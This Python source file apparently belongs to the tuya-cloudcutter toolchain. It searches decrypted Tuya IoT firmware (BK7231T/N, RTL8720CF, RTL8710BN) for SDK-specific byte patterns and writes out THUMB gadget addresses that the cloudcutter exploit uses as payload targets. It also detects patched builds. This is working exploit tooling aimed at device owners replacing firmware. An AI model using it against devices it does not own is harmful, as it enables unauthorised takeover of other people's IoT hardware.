import os.path
import sys
from enum import Enum


class Platform(Enum):
    BK7231T = "BK7231T"
    BK7231N = "BK7231N"
    RTL8720CF = "RTL8720CF"
    RTL8710BN = "RTL8710BN"


class PlatformInfo(object):
    def __init__(self, platform : Platform = None, base_address : int = None, start_offset : int = None):
        self.platform = platform
        match platform:
            case Platform.BK7231T | Platform.BK7231N:
                self.address_size = 3
                self.base_address = base_address if base_address else 0x0
                self.start_offset = start_offset if start_offset else 0x10000
            case Platform.RTL8720CF:
                self.address_size = 4
                self.base_address = base_address if base_address else 0x9b000000
                self.start_offset = start_offset if start_offset else 0x0
            case Platform.RTL8710BN:
                self.address_size = 4
                self.base_address = base_address if base_address else 0x0800B000
                self.start_offset = start_offset if start_offset else 0x0
            case _:
                self.address_size = 0
                self.base_address = base_address if base_address else 0x0
                self.start_offset = start_offset if start_offset else 0


class Pattern(object):
    def __init__(self, type, matchString, count, index, padding : int = 0):
        self.type = type
        self.matchString = matchString
        self.count = count
        self.index = index
        self.padding = padding        


PATCHED_PATTERNS_TUYAOS3 = [
    "547579614f5320563a33", # TuyaOS V:3
]

PATCHED_PATTERNS_BK7231T = [
    "68301ff051f901981ef0a8ff2b1c", # Patched BK7231T
]

PATCHED_PATTERNS_BK7231N = [
    "2d6811226b1dff33181c00210393", # Patched BK7231N short/combined
    "2d6811226b1dff33181c0021039329f0", # Patched BK7231N 2.3.1
    "2d6811226b1dff33181c002103930bf0", # Patched BK7231N 2.3.3
]

PATCHED_PATTERNS_RTL8720CF = [
    "d9f80060112206f5827b", # Patched RTL8720CF TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.4_CAD:1.0.5_CD:1.0.0
]


class CodePatternFinder(object):
    def __init__(self, platform : PlatformInfo):
        self.platform = platform

    def bytecode_search(self, bytecode: bytes, stop_at_first: bool = True):
        offset = appcode.find(bytecode, 0)

        if offset == -1:
            return []

        matches = [self.platform.base_address + offset]
        if stop_at_first:
            return matches

        offset = appcode.find(bytecode, offset+1)
        while offset != -1:
            matches.append(self.platform.base_address + offset)
            offset = appcode.find(bytecode, offset+1)

        return matches

    def set_final_thumb_offset(self, address):
        # Because we're only scanning the app partition, we must add the offset for the bootloader
        # Also add an offset of 1 for the THUMB
        return address + self.platform.start_offset + 1


def name_output_file(desired_appended_name):
    return appcode_path + "_" + desired_appended_name


def walk_app_code():
    print(f"[+] Searching for known exploit patterns")
    if b'TUYA' not in appcode:
        raise RuntimeError('[!] App binary does not appear to be correctly decrypted, or has no Tuya references.')

    if b'TuyaOS V:3' in appcode:
        for patch_pattern in PATCHED_PATTERNS_TUYAOS3:
            if check_for_patched(patch_pattern):
                return

    if b'AT bk7231t' in appcode:
        for patch_pattern in PATCHED_PATTERNS_BK7231T:
            if check_for_patched(patch_pattern):
                return

    if b'AT bk7231n' in appcode or b'AT BK7231NL' in appcode:
        for patch_pattern in PATCHED_PATTERNS_BK7231N:
            if check_for_patched(patch_pattern):
                return

    if b'AT rtl8720cf_ameba' in appcode:
        for patch_pattern in PATCHED_PATTERNS_RTL8720CF:
            if check_for_patched(patch_pattern):
                return

    # Early BK7231T when it was built with a realtek-like string.
    if b'BK7231S_2M' in appcode and b'AT 8710_2M' in appcode:
        # Older versions of BK7231T, BS version 30.04, SDK 2.0.0
        if b'TUYA IOT SDK V:2.0.0 BS:30.04' in appcode:
            # 04 1e 2c d1 11 9b is the byte pattern for datagram payload
            # 3 matches, 2nd is correct
            # 2b 68 30 1c 98 47 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.BK7231T), "BK7231T SDK 2.0.0 8710_2M",
                    Pattern("datagram", "041e2cd1119b", 1, 0),
                    Pattern("finish", "2b68301c9847", 1, 0))
            return

        # Older versions of BK7231T, BS version 30.05/30.06, SDK 2.0.0
        if b'TUYA IOT SDK V:2.0.0 BS:30.05' in appcode or b'TUYA IOT SDK V:2.0.0 BS:30.06' in appcode:
            # 04 1e 07 d1 11 9b 21 1c 00 is the byte pattern for datagram payload
            # 3 matches, 2nd is correct
            # 2b 68 30 1c 98 47 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.BK7231T), "BK7231T SDK 2.0.0 8710_2M",
                    Pattern("datagram", "041e07d1119b211c00", 3, 1),
                    Pattern("finish", "2b68301c9847", 1, 0))
            return

    # Oddball BK7231T built without bluetooth support.
    if b'AT bk7231t_nobt' in appcode:
        # Newer versions of BK7231T, BS 40.00, SDK 1.0.x, nobt
        if b'TUYA IOT SDK V:1.0.' in appcode:
            # b5 4f 06 1e 07 d1 is the byte pattern for datagram payload
            # 1 match should be found
            # 23 68 38 1c 98 47 is the byte pattern for finish
            # 2 matches should be found, 1st is correct
            process(PlatformInfo(Platform.BK7231T), "SDK 1.0.# nobt",
                    Pattern("datagram", "b54f061e07d1", 1, 0),
                    Pattern("finish", "2368381c9847", 2, 0))
            return

    # Typical newer BK7231T
    if b'AT bk7231t' in appcode:
        # Newer versions of BK7231T, BS 40.00, SDK 1.0.x
        if b'TUYA IOT SDK V:1.0.' in appcode:
            # a1 4f 06 1e is the byte pattern for datagram payload
            # 1 match should be found
            # 23 68 38 1c 98 47 is the byte pattern for finish
            # 2 matches should be found, 1st is correct
            process(PlatformInfo(Platform.BK7231T), "SDK 1.0.#",
                    Pattern("datagram", "a14f061e", 1, 0),
                    Pattern("finish", "2368381c9847", 2, 0))
            return

        # Newer versions of BK7231T, BS 40.00, SDK 2.3.0
        if b'TUYA IOT SDK V:2.3.0' in appcode:
            # 04 1e 08 d1 4d 4b is the byte pattern for ssid payload with a padding of 20
            # 1 match should be found
            # 7b 69 20 1c 98 47 is the byte pattern for finish
            # 1 match should be found, 1st is correct
            process(PlatformInfo(Platform.BK7231T), "SDK 2.3.0",
                    Pattern("ssid", "041e08d14d4b", 1, 0, 20),
                    Pattern("finish", "7b69201c9847", 1, 0))
            return

        # Newest versions of BK7231T, BS 40.00, SDK 2.3.2
        if b'TUYA IOT SDK V:2.3.2 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode:
            # 04 1e 00 d1 0c e7 is the byte pattern for ssid payload with a padding of 8
            # 1 match should be found
            # bb 68 20 1c 98 47 is the byte pattern for finish
            # 1 match should be found, 1st is correct
            process(PlatformInfo(Platform.BK7231T), "SDK 2.3.2",
                    Pattern("ssid", "041e00d10ce7", 1, 0, 8),
                    Pattern("finish", "bb68201c9847", 1, 0))
            return

    # BK7231N and BK7231NL
    if b'AT bk7231n' in appcode or b'AT BK7231NL' in appcode:
        # This one build is slightly different than the rest of the following 2.3.1 builds
        if (b'TUYA IOT SDK V:2.3.1 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode
                and b'BUILD AT:2021_02_26_12_42_29 BY embed FOR ty_iot_sdk AT bk7231n' in appcode):
            # 05 1e 00 d1 c9 e6 is the byte pattern for ssid payload with a padding of 4
            # 1 match should be found
            # 43 68 20 1c 98 47 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.BK7231N), "SDK 2.3.1",
                    Pattern("ssid", "051e00d1c9e6", 1, 0, 4),
                    Pattern("finish", "4368201c9847", 1, 0))
            return
        
        # BK7231N, BS 40.00, SDK 2.3.1, CAD 1.0.3
        # 0.0.2 is also a variant of 2.3.1
        if (b'TUYA IOT SDK V:2.3.1 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode
                or b'TUYA IOT SDK V:0.0.2 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode
                or b'TUYA IOT SDK V:2.3.1 BS:40.00_PT:2.2_LAN:3.4_CAD:1.0.3_CD:1.0.0' in appcode
                or b'TUYA IOT SDK V:ffcgroup BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode):
            # 05 1e 00 d1 15 e7 is the byte pattern for ssid payload with a padding of 4
            # 1 match should be found
            # 43 68 20 1c 98 47 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.BK7231N), "SDK 2.3.1",
                    Pattern("ssid", "051e00d115e7", 1, 0, 4),
                    Pattern("finish", "4368201c9847", 1, 0))
            return

        # BK7231N, BS 40.00, SDK 2.3.3, CAD 1.0.4
        if b'TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode:
            # 05 1e 00 d1 13 e7 is the byte pattern for ssid payload with a padding of 4
            # 1 match should be found
            # 43 68 20 1c 98 47 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.BK7231N), "SDK 2.3.3 LAN 3.3/CAD 1.0.4",
                    Pattern("ssid", "051e00d113e7", 1, 0, 4),
                    Pattern("finish", "4368201c9847", 1, 0))
            return

        # BK7231N, BS 40.00, SDK 2.3.3, CAD 1.0.5
        if b'TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.4_CAD:1.0.5_CD:1.0.0' in appcode:
            # 05 1e 00 d1 fc e6 is the byte pattern for ssid payload with a padding of 4
            # 1 match should be found
            # 43 68 20 1c 98 47 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.BK7231N), "SDK 2.3.3 LAN 3.4/CAD 1.0.5",
                    Pattern("ssid", "051e00d1fce6", 1, 0, 4),
                    Pattern("finish", "4368201c9847", 1, 0))
            return

    # Special case for a RTL8720CF build with no SDK string
    # RTL8720CF, 2.3.0 SDK with no SDK string
    if b'TUYA IOT SDK' not in appcode and b'AmebaZII' in appcode and b'\x002.3.0\x00' in appcode:
        # 28 46 66 6a b0 47 is the byte pattern for ssid with a padding of 4
        # 1 match should be found
        # df f8 3c 81 06 46 is the byte pattern for passwd with a padding of 2
        # 1 match should be found
        # 04 46 30 b1 00 68 is the byte pattern for finish
        # 2 matches should be found, second is correct
        process(PlatformInfo(Platform.RTL8720CF), "SDK 2.3.0",
                Pattern("ssid", "2846666ab047", 1, 0, 4),
                Pattern("passwd", "dff83c810646", 1, 0, 2),
                Pattern("finish", "044630b10068", 2, 1))
        return

    # RTL8720CF
    if b'AT rtl8720cf_ameba' in appcode:
        # TUYA IOT SDK V:1.0.8 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.2_CD:1.0.0
        # TUYA IOT SDK V:1.0.11 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.2_CD:1.0.0
        # TUYA IOT SDK V:1.0.12 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.2_CD:1.0.0
        # TUYA IOT SDK V:1.0.13 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.2_CD:1.0.0
        # TUYA IOT SDK V:1.0.14 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.2_CD:1.0.0
        if b'TUYA IOT SDK V:1.0.' in appcode:
            # SDK 1.0.x has a special XIP load address and offset
            process(PlatformInfo(Platform.RTL8720CF, 0x9b000000 - 0x8000), "SDK 1.0.x",
                    Pattern("token", "464f054628b9", 1, 0),
                    Pattern("finish", "d8f8003011aa", 1, 0))
            return
        
        # RTL8720CF 2.3.0 SDK with SDK string
        if (b'TUYA IOT SDK V:2.3.0 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode
                and (b'BUILD AT:2021_01_06_11_13_21 BY embed FOR ty_iot_sdk_bugfix AT rtl8720cf_ameba' in appcode
                    or b'BUILD AT:2021_04_29_18_59_39 BY embed FOR ty_iot_sdk_bugfix AT rtl8720cf_ameba' in appcode)):
            # 5b 68 20 46 98 47 is the byte pattern for token
            # 2 matches should be found, second is correct
            # df f8 34 80 06 46 is the byte pattern for passwd with a padding of 4
            # 1 match should be found
            # d8 f8 00 80 b8 f1 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.RTL8720CF), "SDK 2.3.0",
                    Pattern("token", "5b6820469847", 2, 1),
                    Pattern("passwd", "dff834800646", 1, 0, 4),
                    Pattern("finish", "d8f80080b8f1", 1, 0))
            return

        # Same as 2.3.0 without SDK string above
        if b'TUYA IOT SDK V:2.3.0 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode and b'BUILD AT:2021_06_17_16_35_07 BY embed FOR ty_iot_sdk_bugfix AT rtl8720cf_ameba' in appcode:
            # 28 46 66 6a b0 47 is the byte pattern for ssid with a padding of 4
            # 1 match should be found
            # df f8 3c 81 06 46 is the byte pattern for passwd with a padding of 2
            # 1 match should be found
            # 04 46 30 b1 00 68 is the byte pattern for finish
            # 2 matches should be found, second is correct
            process(PlatformInfo(Platform.RTL8720CF), "SDK 2.3.0",
                    Pattern("ssid", "2846666ab047", 1, 0, 4),
                    Pattern("passwd", "dff83c810646", 1, 0, 2),
                    Pattern("finish", "044630b10068", 2, 1))
            return

        # TUYA IOT SDK V:2.3.1 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0
        if b'TUYA IOT SDK V:2.3.1 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0' in appcode:
            # 05 46 00 28 3f f4 a6 ac is the byte pattern for token
            # 1 match should be found
            # 28 46 d8 f8 04 30 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.RTL8720CF), "SDK 2.3.1",
                    Pattern("token", "054600283ff4a6ac", 1, 0, 4),
                    Pattern("finish", "2846d8f80430", 1, 0))
            return

        # TUYA IOT SDK V:2.3.2 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0
        if b'TUYA IOT SDK V:2.3.2 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode:
            # 05 46 00 28 3f f4 ba ac is the byte pattern for token
            # 1 match should be found
            # 28 46 d8 f8 04 30 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.RTL8720CF), "SDK 2.3.2",
                    Pattern("token", "054600283ff4baac", 1, 0, 4),
                    Pattern("finish", "2846d8f80430", 1, 0))
            return

        # TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0
        # Early 2.3.3 are the same as 2.3.2
        if (b'TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode 
            and (b'BUILD AT:2021_09_22_16_52_29 BY embed FOR ty_iot_sdk AT rtl8720cf_ameba' in appcode
                 or b'BUILD AT:2023_03_02_17_45_15 BY ci_manage FOR ty_iot_sdk AT rtl8720cf_ameba' in appcode)):
            # 05 46 00 28 3f f4 ba ac is the byte pattern for token
            # 1 match should be found
            # 28 46 d8 f8 04 30 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.RTL8720CF), "SDK 2.3.3 (older)",
                    Pattern("token", "054600283ff4baac", 1, 0, 4),
                    Pattern("finish", "2846d8f80430", 1, 0))
            return

        # TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0
        if b'TUYA IOT SDK V:2.3.3 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode:
            # 28 46 00 f0 2a fd is the byte pattern for token
            # 1 match should be found
            # b8 f1 0e 0f 7f d9 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.RTL8720CF), "SDK 2.3.3 (newer)",
                    Pattern("token", "284600f02afd", 1, 0),
                    Pattern("finish", "b8f10e0f7fd9", 1, 0))
            return
        
        # TUYA IOT SDK V:2.3.4 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0
        # Same as 2.3.2 and earlier 2.3.3
        if b'TUYA IOT SDK V:2.3.4 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.4_CD:1.0.0' in appcode:
            # 05 46 00 28 3f f4 ba ac is the byte pattern for token
            # 1 match should be found
            # 28 46 d8 f8 04 30 is the byte pattern for finish
            # 1 match should be found
            process(PlatformInfo(Platform.RTL8720CF), "SDK 2.3.4",
                    Pattern("token", "054600283ff4baac", 1, 0, 4),
                    Pattern("finish", "2846d8f80430", 1, 0))
            return

    # TUYA IOT SDK V:2.0.0 BS:30.04_PT:2.2_LAN:3.3_CAD:1.0.2_CD:1.0.0
    if b'AT 8710_2M' in appcode and b'rtl8710b' in appcode:
        raise RuntimeError('RTL8710BN SDK 2.0.0 not yet supported.')

    # TUYA IOT SDK V:1.0.7 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.2_CD:1.0.0
    if b'AT rtl8710bn' in appcode and b'TUYA IOT SDK V:1.0.' in appcode:
        # df f8 2c 81 05 46 is the byte pattern for token
        # 1 match should be found
        # 20 46 33 68 98 47 is the byte pattern for finish
        # 2 matches should be found, use first (or any)
        process(PlatformInfo(Platform.RTL8710BN), "SDK 1.0.x",
                Pattern("token", "dff82c810546", 1, 0),
                Pattern("finish", "204633689847", 2, 0))
        return

    # TUYA IOT SDK V:2.3.0 BS:40.00_PT:2.2_LAN:3.3_CAD:1.0.3_CD:1.0.0
    if b'AT rtl8710bn' in appcode and b'TUYA IOT SDK V:2.3.0' in appcode:
        # 40 b9 56 4b 01 93 is the byte pattern for finish
        # 3 matches should be found, use first
        process(PlatformInfo(Platform.RTL8710BN), "SDK 2.3.0",
                Pattern("finish", "40b9564b0193", 3, 0))
        return

    raise RuntimeError('Unknown pattern, please open a new issue and include the bin.')


def check_for_patched(known_patch_pattern):
    matcher = CodePatternFinder(PlatformInfo())
    patched_bytecode = bytes.fromhex(known_patch_pattern)
    patched_matches = matcher.bytecode_search(patched_bytecode, stop_at_first=True)

    if patched_matches:
        with open(name_output_file('patched.txt'), 'w') as f:
            f.write('patched')
        print("==============================================================================================================")
        print("[!] The binary supplied appears to be patched and no longer vulnerable to the tuya-cloudcutter exploit.")
        print("==============================================================================================================")
        return True
    
    return False


def find_payload(platformInfo, pattern : Pattern):
    matcher = CodePatternFinder(platformInfo)
    print(f"[+] Searching for {pattern.type}[{pattern.padding}] payload address")
    bytecode = bytes.fromhex(pattern.matchString)
    matches = matcher.bytecode_search(bytecode, stop_at_first=False)
    if not matches or len(matches) != pattern.count:
        return -1, f"[!] Failed to find {pattern.type}[{pattern.padding}] payload address (found {len(matches)}, expected {pattern.count})"
    addr = matcher.set_final_thumb_offset(matches[pattern.index])
    for b in addr.to_bytes(platformInfo.address_size, byteorder='little'):
        if b == 0:
            # TODO: make this a better alternate search if pattern.index is already max
            if pattern.type == "finish" and pattern.count > 1:
                print(f"[!] Preferred {pattern.type} address ({addr:X}) contained a null byte, trying available alternative")
                addr = matcher.set_final_thumb_offset(matches[pattern.index + 1])
            else:
                return -1, f"[!] {pattern.type} address ({addr:X}) contains a null byte, unable to continue"
    print(f"[+] {pattern.type}[{pattern.padding}] payload address gadget (THUMB): 0x{addr:X}")
    
    with open(name_output_file(f'address_{pattern.type}.txt'), 'w') as f:
        f.write(f'0x{addr:X}')
    if pattern.padding > 0:
        with open(name_output_file(f'address_{pattern.type}_padding.txt'), 'w') as f:
            f.write(f"{pattern.padding}")
    return 0, ""


def process(platformInfo, sdk_identifier, pattern1 : Pattern, pattern2 : Pattern = None, pattern3 : Pattern = None):
    with open(name_output_file('chip.txt'), 'w') as f:
        f.write(f'{platformInfo.platform.value}')

    
    combined_payload_type = f"{pattern1.type}[{pattern1.padding}]"
    if pattern2:
        combined_payload_type += f" + {pattern2.type}[{pattern2.padding}]"
    if pattern3:
        combined_payload_type += f" + {pattern3.type}[{pattern3.padding}]"
    print(f"[+] Matched pattern for {platformInfo.platform.value} {sdk_identifier}, payload type {combined_payload_type}")

    pattern1_result, pattern1_message = find_payload(platformInfo, pattern1)
    pattern2_message = None
    if pattern2:
        pattern2_result, pattern2_message = find_payload(platformInfo, pattern2)
    pattern3_message = None
    if pattern3:
        pattern3_result, pattern3_message = find_payload(platformInfo, pattern3)
    
    if pattern1_result < 0 or (pattern2 and pattern2_result < 0) or (pattern3 and pattern3_result < 0):
        raise RuntimeError("\r\n".join([x for x in [pattern1_message, pattern2_message, pattern3_message] if x]))

    with open(name_output_file('haxomatic_matched.txt'), 'w') as f:
        f.write('1')


def run(decrypted_app_file: str):
    if not decrypted_app_file:
        print('Usage: python haxomatic.py <app code file>')
        sys.exit(1)

    global appcode_path, appcode
    appcode_path = decrypted_app_file.replace(".bin", "")
    if appcode_path.endswith("_active_app"):
        appcode_path = appcode_path.replace("_active_app", "")

    if os.path.exists(name_output_file("haxomatic_matched.txt")):
        print('[+] Haxomatic has already been run')
        return

    with open(decrypted_app_file, 'rb') as fs:
        appcode = fs.read()
        walk_app_code()


if __name__ == '__main__':
    run(sys.argv[1])
